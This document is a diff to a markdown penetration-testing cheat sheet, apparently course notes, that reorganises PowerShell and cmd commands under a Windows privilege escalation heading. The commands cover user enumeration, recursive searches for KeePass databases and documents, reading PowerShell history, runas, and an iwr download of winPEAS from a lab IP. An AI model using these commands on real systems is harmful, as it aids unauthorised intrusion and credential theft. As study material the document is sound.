@@ -59,8 +59,7 @@
 * [Exiftool](#Exiftool)
 * [Microsoft Windows Library Files](#Microsoft-Windows-Library-Files)
 * [Mimikatz](#Mimikatz)
-* [PowerShell commands](#PowerShell-commands)
-* [Command Prompt commands](#Command-Prompt-commands)
+* [Windows Privilege Escalation](#Windows-Privilege-Escalation)
 
 # Tools
 
@@ -963,9 +962,11 @@ Injected =)
 PS C:\Users\offsec> type C:\Windows\System32\mimilsa.log
 ~~~
 
-# PowerShell commands
+# Windows Privilege Escalation
 
-## Base64 encoding/decoding
+## Enumerating Windows
+
+### Base64 encoding/decoding
 
 ~~~ powershell
 $ pwsh
@@ -976,7 +977,7 @@ PS> [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("VABFAFMA
 TEST
 ~~~
 
-## Get Local Users/Groups
+### Get Local Users/Groups
 
 ~~~ powershell
 PS> Get-LocalUser
@@ -984,20 +985,20 @@ PS> Get-LocalGroup
 PS> Get-LocalGroupMember Administrators
 ~~~
 
-## Installed applications
+### Listing installed applications
 
 ~~~ powershell
 PS> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
 PS> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
 ~~~
 
-## Get Process's path
+### Get Process's path
 
 ~~~ powershell
 PS> Get-Process NonStandardProcess | Select-Object Path
 ~~~
 
-## Files searching
+### Files searching
 
 ~~~ powershell
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
@@ -1006,31 +1007,40 @@ Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.doc
 ~~~
 
 
-## Select String(grep)
+### Select String(grep)
 
 ~~~ powershell
 type result.txt | select-string master
 ~~~
 
 
-## Get PowerShell History
+### Get PowerShell History
 
 ~~~ powershell
 type (Get-PSReadLineOption).HistorySavePath
 ~~~
 
-## Invoke Web Request(File download)
+### Invoke Web Request(File download)
 
 ~~~ powershell
 iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
 ~~~
 
 
-# Command Prompt commands
 
-## Run as other user
+### Run as other user
 
 ~~~ cmd
 runas /user:backupadmin cmd
 ~~~
+
+
+## Leveraging Windows Services
+
+### Service Binary Hijacking
+
+### DLL Hijacking
+
+### Unquoted Service Paths
+
 
